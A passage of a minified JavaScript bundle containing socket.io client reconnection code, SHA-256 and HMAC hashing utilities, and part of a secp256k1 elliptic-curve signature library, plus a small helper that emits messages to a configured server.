              (this._reconnecting = !1),
              this.onclose("forced close"),
              this.engine && this.engine.close();
          }
          disconnect() {
            return this._close();
          }
          onclose(e, t) {
            this.cleanup(),
              this.backoff.reset(),
              (this._readyState = "closed"),
              this.emitReserved("close", e, t),
              this._reconnection && !this.skipReconnect && this.reconnect();
          }
          reconnect() {
            if (this._reconnecting || this.skipReconnect) return this;
            const e = this;
            if (this.backoff.attempts >= this._reconnectionAttempts)
              this.backoff.reset(),
                this.emitReserved("reconnect_failed"),
                (this._reconnecting = !1);
            else {
              const t = this.backoff.duration();
              this._reconnecting = !0;
              const n = this.setTimeoutFn(() => {
                e.skipReconnect ||
                  (this.emitReserved("reconnect_attempt", e.backoff.attempts),
                  e.skipReconnect ||
                    e.open((t) => {
                      t
                        ? ((e._reconnecting = !1),
                          e.reconnect(),
                          this.emitReserved("reconnect_error", t))
                        : e.onreconnect();
                    }));
              }, t);
              this.opts.autoUnref && n.unref(),
                this.subs.push(function () {
                  clearTimeout(n);
                });
            }
          }
          onreconnect() {
            const e = this.backoff.attempts;
            (this._reconnecting = !1),
              this.backoff.reset(),
              this.emitReserved("reconnect", e);
          }
        }
        const be = {};
        function ve(e, t) {
          "object" === typeof e && ((t = e), (e = void 0));
          const n = (function (e) {
              let t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : "",
                n = arguments.length > 2 ? arguments[2] : void 0,
                r = e;
              (n = n || ("undefined" !== typeof location && location)),
                null == e && (e = n.protocol + "//" + n.host),
                "string" === typeof e &&
                  ("/" === e.charAt(0) &&
                    (e = "/" === e.charAt(1) ? n.protocol + e : n.host + e),
                  /^(https?|wss?):\/\//.test(e) ||
                    (e =
                      "undefined" !== typeof n
                        ? n.protocol + "//" + e
                        : "https://" + e),
                  (r = G(e))),
                r.port ||
                  (/^(http|ws)$/.test(r.protocol)
                    ? (r.port = "80")
                    : /^(http|ws)s$/.test(r.protocol) && (r.port = "443")),
                (r.path = r.path || "/");
              const i =
                -1 !== r.host.indexOf(":") ? "[" + r.host + "]" : r.host;
              return (
                (r.id = r.protocol + "://" + i + ":" + r.port + t),
                (r.href =
                  r.protocol +
                  "://" +
                  i +
                  (n && n.port === r.port ? "" : ":" + r.port)),
                r
              );
            })(e, (t = t || {}).path || "/socket.io"),
            r = n.source,
            i = n.id,
            o = n.path,
            s = be[i] && o in be[i].nsps;
          let a;
          return (
            t.forceNew || t["force new connection"] || !1 === t.multiplex || s
              ? (a = new me(r, t))
              : (be[i] || (be[i] = new me(r, t)), (a = be[i])),
            n.query && !t.query && (t.query = n.queryKey),
            a.socket(n.path, t)
          );
        }
        Object.assign(ve, { Manager: me, Socket: ye, io: ve, connect: ve });
        var Ee = n(6128);
        const { server: Se } = Ee,
          xe = (e) => {
            ve(Se).emit("connect_message", { data: e });
          };
      },
      4337: (e, t) => {
        "use strict";
        function n(e) {
          if (!Number.isSafeInteger(e) || e < 0)
            throw new Error(`Wrong positive integer: ${e}`);
        }
        function r(e) {
          if ("boolean" !== typeof e)
            throw new Error(`Expected boolean, not ${e}`);
        }
        function i(e) {
          if (!(e instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
          for (
            var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
            r < t;
            r++
          )
            n[r - 1] = arguments[r];
          if (n.length > 0 && !n.includes(e.length))
            throw new TypeError(
              `Expected Uint8Array of length ${n}, not of length=${e.length}`
            );
        }
        function o(e) {
          if ("function" !== typeof e || "function" !== typeof e.create)
            throw new Error("Hash should be wrapped by utils.wrapConstructor");
          n(e.outputLen), n(e.blockLen);
        }
        function s(e) {
          let t =
            !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
          if (e.destroyed) throw new Error("Hash instance has been destroyed");
          if (t && e.finished)
            throw new Error("Hash#digest() has already been called");
        }
        function a(e, t) {
          i(e);
          const n = t.outputLen;
          if (e.length < n)
            throw new Error(
              `digestInto() expects output buffer of length at least ${n}`
            );
        }
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.output = t.exists = t.hash = t.bytes = t.bool = t.number = void 0),
          (t.number = n),
          (t.bool = r),
          (t.bytes = i),
          (t.hash = o),
          (t.exists = s),
          (t.output = a);
        const l = {
          number: n,
          bool: r,
          bytes: i,
          hash: o,
          exists: s,
          output: a,
        };
        t.default = l;
      },
      747: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.SHA2 = void 0);
        const r = n(4337),
          i = n(4361);
        class o extends i.Hash {
          constructor(e, t, n, r) {
            super(),
              (this.blockLen = e),
              (this.outputLen = t),
              (this.padOffset = n),
              (this.isLE = r),
              (this.finished = !1),
              (this.length = 0),
              (this.pos = 0),
              (this.destroyed = !1),
              (this.buffer = new Uint8Array(e)),
              (this.view = (0, i.createView)(this.buffer));
          }
          update(e) {
            r.default.exists(this);
            const { view: t, buffer: n, blockLen: o } = this,
              s = (e = (0, i.toBytes)(e)).length;
            for (let r = 0; r < s; ) {
              const a = Math.min(o - this.pos, s - r);
              if (a !== o)
                n.set(e.subarray(r, r + a), this.pos),
                  (this.pos += a),
                  (r += a),
                  this.pos === o && (this.process(t, 0), (this.pos = 0));
              else {
                const t = (0, i.createView)(e);
                for (; o <= s - r; r += o) this.process(t, r);
              }
            }
            return (this.length += e.length), this.roundClean(), this;
          }
          digestInto(e) {
            r.default.exists(this),
              r.default.output(e, this),
              (this.finished = !0);
            const { buffer: t, view: n, blockLen: o, isLE: s } = this;
            let { pos: a } = this;
            (t[a++] = 128),
              this.buffer.subarray(a).fill(0),
              this.padOffset > o - a && (this.process(n, 0), (a = 0));
            for (let r = a; r < o; r++) t[r] = 0;
            !(function (e, t, n, r) {
              if ("function" === typeof e.setBigUint64)
                return e.setBigUint64(t, n, r);
              const i = BigInt(32),
                o = BigInt(4294967295),
                s = Number((n >> i) & o),
                a = Number(n & o),
                l = r ? 4 : 0,
                c = r ? 0 : 4;
              e.setUint32(t + l, s, r), e.setUint32(t + c, a, r);
            })(n, o - 8, BigInt(8 * this.length), s),
              this.process(n, 0);
            const l = (0, i.createView)(e);
            this.get().forEach((e, t) => l.setUint32(4 * t, e, s));
          }
          digest() {
            const { buffer: e, outputLen: t } = this;
            this.digestInto(e);
            const n = e.slice(0, t);
            return this.destroy(), n;
          }
          _cloneInto(e) {
            e || (e = new this.constructor()), e.set(...this.get());
            const {
              blockLen: t,
              buffer: n,
              length: r,
              finished: i,
              destroyed: o,
              pos: s,
            } = this;
            return (
              (e.length = r),
              (e.pos = s),
              (e.finished = i),
              (e.destroyed = o),
              r % t && e.buffer.set(n),
              e
            );
          }
        }
        t.SHA2 = o;
      },
      4096: (e, t) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.crypto = void 0),
          (t.crypto = {
            node: void 0,
            web:
              "object" === typeof self && "crypto" in self
                ? self.crypto
                : void 0,
          });
      },
      5968: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.hmac = void 0);
        const r = n(4337),
          i = n(4361);
        class o extends i.Hash {
          constructor(e, t) {
            super(),
              (this.finished = !1),
              (this.destroyed = !1),
              r.default.hash(e);
            const n = (0, i.toBytes)(t);
            if (((this.iHash = e.create()), !(this.iHash instanceof i.Hash)))
              throw new TypeError(
                "Expected instance of class which extends utils.Hash"
              );
            const o = (this.blockLen = this.iHash.blockLen);
            this.outputLen = this.iHash.outputLen;
            const s = new Uint8Array(o);
            s.set(
              n.length > this.iHash.blockLen ? e.create().update(n).digest() : n
            );
            for (let r = 0; r < s.length; r++) s[r] ^= 54;
            this.iHash.update(s), (this.oHash = e.create());
            for (let r = 0; r < s.length; r++) s[r] ^= 106;
            this.oHash.update(s), s.fill(0);
          }
          update(e) {
            return r.default.exists(this), this.iHash.update(e), this;
          }
          digestInto(e) {
            r.default.exists(this),
              r.default.bytes(e, this.outputLen),
              (this.finished = !0),
              this.iHash.digestInto(e),
              this.oHash.update(e),
              this.oHash.digestInto(e),
              this.destroy();
          }
          digest() {
            const e = new Uint8Array(this.oHash.outputLen);
            return this.digestInto(e), e;
          }
          _cloneInto(e) {
            e || (e = Object.create(Object.getPrototypeOf(this), {}));
            const {
              oHash: t,
              iHash: n,
              finished: r,
              destroyed: i,
              blockLen: o,
              outputLen: s,
            } = this;
            return (
              (e.finished = r),
              (e.destroyed = i),
              (e.blockLen = o),
              (e.outputLen = s),
              (e.oHash = t._cloneInto(e.oHash)),
              (e.iHash = n._cloneInto(e.iHash)),
              e
            );
          }
          destroy() {
            (this.destroyed = !0), this.oHash.destroy(), this.iHash.destroy();
          }
        }
        (t.hmac = (e, t, n) => new o(e, t).update(n).digest()),
          (t.hmac.create = (e, t) => new o(e, t));
      },
      4304: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.sha256 = void 0);
        const r = n(747),
          i = n(4361),
          o = (e, t, n) => (e & t) ^ (e & n) ^ (t & n),
          s = new Uint32Array([
            1116352408, 1899447441, 3049323471, 3921009573, 961987163,
            1508970993, 2453635748, 2870763221, 3624381080, 310598401,
            607225278, 1426881987, 1925078388, 2162078206, 2614888103,
            3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983,
            1249150122, 1555081692, 1996064986, 2554220882, 2821834349,
            2952996808, 3210313671, 3336571891, 3584528711, 113926993,
            338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700,
            1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
            3259730800, 3345764771, 3516065817, 3600352804, 4094571909,
            275423344, 430227734, 506948616, 659060556, 883997877, 958139571,
            1322822218, 1537002063, 1747873779, 1955562222, 2024104815,
            2227730452, 2361852424, 2428436474, 2756734187, 3204031479,
            3329325298,
          ]),
          a = new Uint32Array([
            1779033703, 3144134277, 1013904242, 2773480762, 1359893119,
            2600822924, 528734635, 1541459225,
          ]),
          l = new Uint32Array(64);
        class c extends r.SHA2 {
          constructor() {
            super(64, 32, 8, !1),
              (this.A = 0 | a[0]),
              (this.B = 0 | a[1]),
              (this.C = 0 | a[2]),
              (this.D = 0 | a[3]),
              (this.E = 0 | a[4]),
              (this.F = 0 | a[5]),
              (this.G = 0 | a[6]),
              (this.H = 0 | a[7]);
          }
          get() {
            const { A: e, B: t, C: n, D: r, E: i, F: o, G: s, H: a } = this;
            return [e, t, n, r, i, o, s, a];
          }
          set(e, t, n, r, i, o, s, a) {
            (this.A = 0 | e),
              (this.B = 0 | t),
              (this.C = 0 | n),
              (this.D = 0 | r),
              (this.E = 0 | i),
              (this.F = 0 | o),
              (this.G = 0 | s),
              (this.H = 0 | a);
          }
          process(e, t) {
            for (let i = 0; i < 16; i++, t += 4) l[i] = e.getUint32(t, !1);
            for (let o = 16; o < 64; o++) {
              const e = l[o - 15],
                t = l[o - 2],
                n = (0, i.rotr)(e, 7) ^ (0, i.rotr)(e, 18) ^ (e >>> 3),
                r = (0, i.rotr)(t, 17) ^ (0, i.rotr)(t, 19) ^ (t >>> 10);
              l[o] = (r + l[o - 7] + n + l[o - 16]) | 0;
            }
            let { A: n, B: r, C: a, D: c, E: u, F: f, G: h, H: d } = this;
            for (let g = 0; g < 64; g++) {
              const e =
                  (d +
                    ((0, i.rotr)(u, 6) ^
                      (0, i.rotr)(u, 11) ^
                      (0, i.rotr)(u, 25)) +
                    (((p = u) & f) ^ (~p & h)) +
                    s[g] +
                    l[g]) |
                  0,
                t =
                  (((0, i.rotr)(n, 2) ^
                    (0, i.rotr)(n, 13) ^
                    (0, i.rotr)(n, 22)) +
                    o(n, r, a)) |
                  0;
              (d = h),
                (h = f),
                (f = u),
                (u = (c + e) | 0),
                (c = a),
                (a = r),
                (r = n),
                (n = (e + t) | 0);
            }
            var p;
            (n = (n + this.A) | 0),
              (r = (r + this.B) | 0),
              (a = (a + this.C) | 0),
              (c = (c + this.D) | 0),
              (u = (u + this.E) | 0),
              (f = (f + this.F) | 0),
              (h = (h + this.G) | 0),
              (d = (d + this.H) | 0),
              this.set(n, r, a, c, u, f, h, d);
          }
          roundClean() {
            l.fill(0);
          }
          destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
          }
        }
        t.sha256 = (0, i.wrapConstructor)(() => new c());
      },
      4361: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.randomBytes =
            t.wrapConstructorWithOpts =
            t.wrapConstructor =
            t.checkOpts =
            t.Hash =
            t.concatBytes =
            t.toBytes =
            t.utf8ToBytes =
            t.asyncLoop =
            t.nextTick =
            t.hexToBytes =
            t.bytesToHex =
            t.isLE =
            t.rotr =
            t.createView =
            t.u32 =
            t.u8 =
              void 0);
        const r = n(4096);
        t.u8 = (e) => new Uint8Array(e.buffer, e.byteOffset, e.byteLength);
        t.u32 = (e) =>
          new Uint32Array(e.buffer, e.byteOffset, Math.floor(e.byteLength / 4));
        t.createView = (e) =>
          new DataView(e.buffer, e.byteOffset, e.byteLength);
        if (
          ((t.rotr = (e, t) => (e << (32 - t)) | (e >>> t)),
          (t.isLE =
            68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0]),
          !t.isLE)
        )
          throw new Error("Non little-endian hardware is not supported");
        const i = Array.from({ length: 256 }, (e, t) =>
          t.toString(16).padStart(2, "0")
        );
        (t.bytesToHex = function (e) {
          if (!(e instanceof Uint8Array))
            throw new Error("Uint8Array expected");
          let t = "";
          for (let n = 0; n < e.length; n++) t += i[e[n]];
          return t;
        }),
          (t.hexToBytes = function (e) {
            if ("string" !== typeof e)
              throw new TypeError(
                "hexToBytes: expected string, got " + typeof e
              );
            if (e.length % 2)
              throw new Error("hexToBytes: received invalid unpadded hex");
            const t = new Uint8Array(e.length / 2);
            for (let n = 0; n < t.length; n++) {
              const r = 2 * n,
                i = e.slice(r, r + 2),
                o = Number.parseInt(i, 16);
              if (Number.isNaN(o) || o < 0)
                throw new Error("Invalid byte sequence");
              t[n] = o;
            }
            return t;
          });
        function o(e) {
          if ("string" !== typeof e)
            throw new TypeError("utf8ToBytes expected string, got " + typeof e);
          return new TextEncoder().encode(e);
        }
        function s(e) {
          if (("string" === typeof e && (e = o(e)), !(e instanceof Uint8Array)))
            throw new TypeError(
              `Expected input type is Uint8Array (got ${typeof e})`
            );
          return e;
        }
        (t.nextTick = async () => {}),
          (t.asyncLoop = async function (e, n, r) {
            let i = Date.now();
            for (let o = 0; o < e; o++) {
              r(o);
              const e = Date.now() - i;
              (e >= 0 && e < n) || (await (0, t.nextTick)(), (i += e));
            }
          }),
          (t.utf8ToBytes = o),
          (t.toBytes = s),
          (t.concatBytes = function () {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            if (!t.every((e) => e instanceof Uint8Array))
              throw new Error("Uint8Array list expected");
            if (1 === t.length) return t[0];
            const r = t.reduce((e, t) => e + t.length, 0),
              i = new Uint8Array(r);
            for (let o = 0, s = 0; o < t.length; o++) {
              const e = t[o];
              i.set(e, s), (s += e.length);
            }
            return i;
          });
        t.Hash = class {
          clone() {
            return this._cloneInto();
          }
        };
        (t.checkOpts = function (e, t) {
          if (
            void 0 !== t &&
            ("object" !== typeof t ||
              ((n = t),
              "[object Object]" !== Object.prototype.toString.call(n) ||
                n.constructor !== Object))
          )
            throw new TypeError("Options should be object or undefined");
          var n;
          return Object.assign(e, t);
        }),
          (t.wrapConstructor = function (e) {
            const t = (t) => e().update(s(t)).digest(),
              n = e();
            return (
              (t.outputLen = n.outputLen),
              (t.blockLen = n.blockLen),
              (t.create = () => e()),
              t
            );
          }),
          (t.wrapConstructorWithOpts = function (e) {
            const t = (t, n) => e(n).update(s(t)).digest(),
              n = e({});
            return (
              (t.outputLen = n.outputLen),
              (t.blockLen = n.blockLen),
              (t.create = (t) => e(t)),
              t
            );
          }),
          (t.randomBytes = function () {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : 32;
            if (r.crypto.web)
              return r.crypto.web.getRandomValues(new Uint8Array(e));
            if (r.crypto.node)
              return new Uint8Array(r.crypto.node.randomBytes(e).buffer);
            throw new Error(
              "The environment doesn't have randomBytes function"
            );
          });
      },
      3845: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.utils =
            t.schnorr =
            t.verify =
            t.signSync =
            t.sign =
            t.getSharedSecret =
            t.recoverPublicKey =
            t.getPublicKey =
            t.Signature =
            t.Point =
            t.CURVE =
              void 0);
        const r = n(9159),
          i = BigInt(0),
          o = BigInt(1),
          s = BigInt(2),
          a = BigInt(3),
          l = BigInt(8),
          c = s ** BigInt(256),
          u = {
            a: i,
            b: BigInt(7),
            P: c - s ** BigInt(32) - BigInt(977),
            n: c - BigInt("432420386565659656852420866394968145599"),
            h: o,
            Gx: BigInt(
              "55066263022277343669578718895168534326250603453777594175500187360389116729240"
            ),
            Gy: BigInt(
              "32670510020758816978083085130507043184471273380659243275938904335757337482424"
            ),
            beta: BigInt(
              "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
            ),
          };
        function f(e) {
          const { a: t, b: n } = u,
            r = P(e * e),
            i = P(r * e);
          return P(i + t * e + n);
        }
        t.CURVE = u;
        const h = u.a === i;
        class d {
          constructor(e, t, n) {
            (this.x = e), (this.y = t), (this.z = n);
          }
          static fromAffine(e) {
            if (!(e instanceof g))
              throw new TypeError("JacobianPoint#fromAffine: expected Point");
            return new d(e.x, e.y, o);
          }
          static toAffineBatch(e) {
            const t = (function (e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : u.P;
              const n = new Array(e.length),
                r = U(
                  e.reduce(
                    (e, r, o) => (r === i ? e : ((n[o] = e), P(e * r, t))),
                    o
                  ),
                  t
                );
              return (
                e.reduceRight(
                  (e, r, o) =>
                    r === i ? e : ((n[o] = P(e * n[o], t)), P(e * r, t)),
                  r
                ),
                n
              );
            })(e.map((e) => e.z));
            return e.map((e, n) => e.toAffine(t[n]));
          }
          static normalizeZ(e) {
            return d.toAffineBatch(e).map(d.fromAffine);
          }
          equals(e) {
            if (!(e instanceof d))
              throw new TypeError("JacobianPoint expected");
            const { x: t, y: n, z: r } = this,
              { x: i, y: o, z: a } = e,
              l = P(r ** s),
              c = P(a ** s),
              u = P(t * c),
              f = P(i * l),
              h = P(P(n * a) * c),
              p = P(P(o * r) * l);
            return u === f && h === p;
          }
          negate() {
            return new d(this.x, P(-this.y), this.z);
          }
          double() {
            const { x: e, y: t, z: n } = this,
              r = P(e ** s),
              i = P(t ** s),
              o = P(i ** s),
              c = P(s * (P((e + i) ** s) - r - o)),
              u = P(a * r),
              f = P(u ** s),
              h = P(f - s * c),
              p = P(u * (c - h) - l * o),
              g = P(s * t * n);
            return new d(h, p, g);
          }
          add(e) {
            if (!(e instanceof d))
              throw new TypeError("JacobianPoint expected");
            const { x: t, y: n, z: r } = this,
              { x: o, y: a, z: l } = e;
            if (o === i || a === i) return this;
            if (t === i || n === i) return e;
            const c = P(r ** s),
              u = P(l ** s),
              f = P(t * u),
              h = P(o * c),
              p = P(P(n * l) * u),
              g = P(P(a * r) * c),
              y = P(h - f),
              w = P(g - p);
            if (y === i) return w === i ? this.double() : d.ZERO;
            const m = P(y ** s),
              b = P(y * m),
              v = P(f * m),
              E = P(w ** s - b - s * v),
              S = P(w * (v - E) - p * b),
              x = P(r * l * y);
            return new d(E, S, x);
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiplyUnsafe(e) {
            const t = d.ZERO;
            if ("bigint" === typeof e && e === i) return t;
            let n = B(e);
            if (n === o) return this;
            if (!h) {
              let e = t,
                r = this;
              for (; n > i; )
                n & o && (e = e.add(r)), (r = r.double()), (n >>= o);
              return e;
            }
            let { k1neg: r, k1: s, k2neg: a, k2: l } = L(n),
              c = t,
              f = t,
              p = this;
            for (; s > i || l > i; )
              s & o && (c = c.add(p)),
                l & o && (f = f.add(p)),
                (p = p.double()),
                (s >>= o),
                (l >>= o);
            return (
              r && (c = c.negate()),
              a && (f = f.negate()),
              (f = new d(P(f.x * u.beta), f.y, f.z)),
              c.add(f)
            );
          }
          precomputeWindow(e) {
            const t = h ? 128 / e + 1 : 256 / e + 1,
              n = [];
            let r = this,
              i = r;
            for (let o = 0; o < t; o++) {
              (i = r), n.push(i);
              for (let t = 1; t < 2 ** (e - 1); t++) (i = i.add(r)), n.push(i);
              r = i.double();
            }
            return n;
          }
          wNAF(e, t) {
            !t && this.equals(d.BASE) && (t = g.BASE);
            const n = (t && t._WINDOW_SIZE) || 1;
            if (256 % n)
              throw new Error(
                "Point#wNAF: Invalid precomputation window, must be power of 2"
              );
            let r = t && p.get(t);
            r ||
              ((r = this.precomputeWindow(n)),
              t && 1 !== n && ((r = d.normalizeZ(r)), p.set(t, r)));
            let i = d.ZERO,
              s = d.ZERO;
            const a = 1 + (h ? 128 / n : 256 / n),
              l = 2 ** (n - 1),
              c = BigInt(2 ** n - 1),
              u = 2 ** n,
              f = BigInt(n);
            for (let h = 0; h < a; h++) {
              const t = h * l;
              let n = Number(e & c);
              if (((e >>= f), n > l && ((n -= u), (e += o)), 0 === n)) {
                let e = r[t];
                h % 2 && (e = e.negate()), (s = s.add(e));
              } else {
                let e = r[t + Math.abs(n) - 1];
                n < 0 && (e = e.negate()), (i = i.add(e));
              }
            }
            return { p: i, f: s };
          }
          multiply(e, t) {
            let n,
              r,
              i = B(e);
            if (h) {
              const { k1neg: e, k1: o, k2neg: s, k2: a } = L(i);
              let { p: l, f: c } = this.wNAF(o, t),
                { p: f, f: h } = this.wNAF(a, t);
              e && (l = l.negate()),
                s && (f = f.negate()),
                (f = new d(P(f.x * u.beta), f.y, f.z)),
                (n = l.add(f)),
                (r = c.add(h));
            } else {
              const { p: e, f: o } = this.wNAF(i, t);
              (n = e), (r = o);
            }
            return d.normalizeZ([n, r])[0];
          }
          toAffine() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : U(this.z);
            const { x: t, y: n, z: r } = this,
              i = e,
              s = P(i * i),
              a = P(s * i),
              l = P(t * s),
              c = P(n * a);
            if (P(r * i) !== o) throw new Error("invZ was invalid");
            return new g(l, c);
          }
        }
        (d.BASE = new d(u.Gx, u.Gy, o)), (d.ZERO = new d(i, o, i));
        const p = new WeakMap();
        class g {
          constructor(e, t) {
            (this.x = e), (this.y = t);
          }
          _setWindowSize(e) {
            (this._WINDOW_SIZE = e), p.delete(this);
          }
          static fromCompressedHex(e) {
            const t = 32 === e.length,
              n = I(t ? e : e.subarray(1));
            if (!M(n)) throw new Error("Point is not on curve");
            let r = (function (e) {
              const { P: t } = u,
                n = BigInt(6),
                r = BigInt(11),
                i = BigInt(22),
                o = BigInt(23),
                l = BigInt(44),
                c = BigInt(88),
                f = (e * e * e) % t,
                h = (f * f * e) % t,
                d = (_(h, a) * h) % t,
                p = (_(d, a) * h) % t,
                g = (_(p, s) * f) % t,
                y = (_(g, r) * g) % t,
                w = (_(y, i) * y) % t,
                m = (_(w, l) * w) % t,
                b = (_(m, c) * m) % t,
                v = (_(b, l) * w) % t,
                E = (_(v, a) * h) % t,
                S = (_(E, o) * y) % t,
                x = (_(S, n) * f) % t;
              return _(x, s);
            })(f(n));
            const i = (r & o) === o;
            if (t) i && (r = P(-r));
            else {
              (1 === (1 & e[0])) !== i && (r = P(-r));
            }
            const l = new g(n, r);
            return l.assertValidity(), l;
          }
          static fromUncompressedHex(e) {
            const t = I(e.subarray(1, 33)),
              n = I(e.subarray(33, 65)),
              r = new g(t, n);
            return r.assertValidity(), r;
          }
          static fromHex(e) {
            const t = O(e),
              n = t.length,
              r = t[0];
            if (32 === n || (33 === n && (2 === r || 3 === r)))
              return this.fromCompressedHex(t);
            if (65 === n && 4 === r) return this.fromUncompressedHex(t);
            throw new Error(
              `Point.fromHex: received invalid point. Expected 32-33 compressed bytes or 65 uncompressed bytes, not ${n}`
            );
          }
          static fromPrivateKey(e) {
            return g.BASE.multiply(j(e));
          }
          static fromSignature(e, t, n) {
            const r = $((e = O(e))),
              { r: i, s: o } = K(t);
            if (0 !== n && 1 !== n)
              throw new Error("Cannot recover signature: invalid recovery bit");
            const s = 1 & n ? "03" : "02",
              a = g.fromHex(s + x(i)),
              { n: l } = u,
              c = U(i, l),
              f = P(-r * c, l),
              h = P(o * c, l),
              d = g.BASE.multiplyAndAddUnsafe(a, f, h);
            if (!d)
              throw new Error("Cannot recover signature: point at infinify");
            return d.assertValidity(), d;
          }
          toRawBytes() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return C(this.toHex(e));
          }
          toHex() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            const t = x(this.x);
            if (e) {
              return `${this.y & o ? "03" : "02"}${t}`;
            }
            return `04${t}${x(this.y)}`;
          }
          toHexX() {
            return this.toHex(!0).slice(2);
          }
          toRawX() {
            return this.toRawBytes(!0).slice(1);
          }
          assertValidity() {
            const e = "Point is not on elliptic curve",
              { x: t, y: n } = this;
            if (!M(t) || !M(n)) throw new Error(e);
            const r = P(n * n);
            if (P(r - f(t)) !== i) throw new Error(e);
          }
          equals(e) {
            return this.x === e.x && this.y === e.y;
          }
          negate() {
            return new g(this.x, P(-this.y));
          }
          double() {
            return d.fromAffine(this).double().toAffine();
          }
          add(e) {
            return d.fromAffine(this).add(d.fromAffine(e)).toAffine();
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiply(e) {
            return d.fromAffine(this).multiply(e, this).toAffine();
          }
          multiplyAndAddUnsafe(e, t, n) {
            const r = d.fromAffine(this),
              s =
                t === i || t === o || this !== g.BASE
                  ? r.multiplyUnsafe(t)
                  : r.multiply(t),
              a = d.fromAffine(e).multiplyUnsafe(n),
              l = s.add(a);
            return l.equals(d.ZERO) ? void 0 : l.toAffine();
          }
        }
        function y(e) {
          return Number.parseInt(e[0], 16) >= 8 ? "00" + e : e;
        }
        function w(e) {
          if (e.length < 2 || 2 !== e[0])
            throw new Error(`Invalid signature integer tag: ${S(e)}`);
          const t = e[1],
            n = e.subarray(2, t + 2);
          if (!t || n.length !== t)
            throw new Error("Invalid signature integer: wrong length");
          if (0 === n[0] && n[1] <= 127)
            throw new Error("Invalid signature integer: trailing length");
          return { data: I(n), left: e.subarray(t + 2) };
        }
        (t.Point = g), (g.BASE = new g(u.Gx, u.Gy)), (g.ZERO = new g(i, i));
        class m {
          constructor(e, t) {
            (this.r = e), (this.s = t), this.assertValidity();
          }
          static fromCompact(e) {
            const t = v(e),
              n = "Signature.fromCompact";
            if ("string" !== typeof e && !t)
              throw new TypeError(`${n}: Expected string or Uint8Array`);
            const r = t ? S(e) : e;
            if (128 !== r.length) throw new Error(`${n}: Expected 64-byte hex`);
            return new m(T(r.slice(0, 64)), T(r.slice(64, 128)));
          }
          static fromDER(e) {
            const t = v(e);
            if ("string" !== typeof e && !t)
              throw new TypeError(
                "Signature.fromDER: Expected string or Uint8Array"
              );
            const { r: n, s: r } = (function (e) {
              if (e.length < 2 || 48 != e[0])
                throw new Error(`Invalid signature tag: ${S(e)}`);
              if (e[1] !== e.length - 2)
                throw new Error("Invalid signature: incorrect length");
              const { data: t, left: n } = w(e.subarray(2)),
                { data: r, left: i } = w(n);
              if (i.length)
                throw new Error(
                  `Invalid signature: left bytes after parsing: ${S(i)}`
                );
              return { r: t, s: r };
            })(t ? e : C(e));
            return new m(n, r);
          }
          static fromHex(e) {
            return this.fromDER(e);
          }
          assertValidity() {
            const { r: e, s: t } = this;
            if (!D(e))
              throw new Error("Invalid Signature: r must be 0 < r < n");
            if (!D(t))
              throw new Error("Invalid Signature: s must be 0 < s < n");
          }
          hasHighS() {
            const e = u.n >> o;
            return this.s > e;
          }
          normalizeS() {
            return this.hasHighS() ? new m(this.r, u.n - this.s) : this;
          }
          toDERRawBytes() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return C(this.toDERHex(e));
          }
          toDERHex() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            const t = y(k(this.s));
            if (e) return t;
            const n = y(k(this.r)),
              r = k(n.length / 2),
              i = k(t.length / 2);
            return `30${k(
              n.length / 2 + t.length / 2 + 4
            )}02${r}${n}02${i}${t}`;
          }
          toRawBytes() {
            return this.toDERRawBytes();
          }
          toHex() {
            return this.toDERHex();
          }
          toCompactRawBytes() {
            return C(this.toCompactHex());
          }
          toCompactHex() {
            return x(this.r) + x(this.s);
          }
        }
        function b() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          if (!t.every(v)) throw new Error("Uint8Array list expected");
          if (1 === t.length) return t[0];
          const r = t.reduce((e, t) => e + t.length, 0),
            i = new Uint8Array(r);
          for (let o = 0, s = 0; o < t.length; o++) {
            const e = t[o];
            i.set(e, s), (s += e.length);
          }
          return i;
        }
        function v(e) {
          return e instanceof Uint8Array;
        }
        t.Signature = m;
        const E = Array.from({ length: 256 }, (e, t) =>
          t.toString(16).padStart(2, "0")
        );
        function S(e) {
          if (!(e instanceof Uint8Array))
            throw new Error("Expected Uint8Array");
          let t = "";
          for (let n = 0; n < e.length; n++) t += E[e[n]];
          return t;
        }
        function x(e) {
          if (e > c) throw new Error("Expected number < 2^256");
          return e.toString(16).padStart(64, "0");
        }
        function A(e) {
          return C(x(e));
        }
        function k(e) {
          const t = e.toString(16);
          return 1 & t.length ? `0${t}` : t;
        }
        function T(e) {
          if ("string" !== typeof e)
            throw new TypeError(
              "hexToNumber: expected string, got " + typeof e
            );
          return BigInt(`0x${e}`);
        }
        function C(e) {
          if ("string" !== typeof e)
            throw new TypeError("hexToBytes: expected string, got " + typeof e);
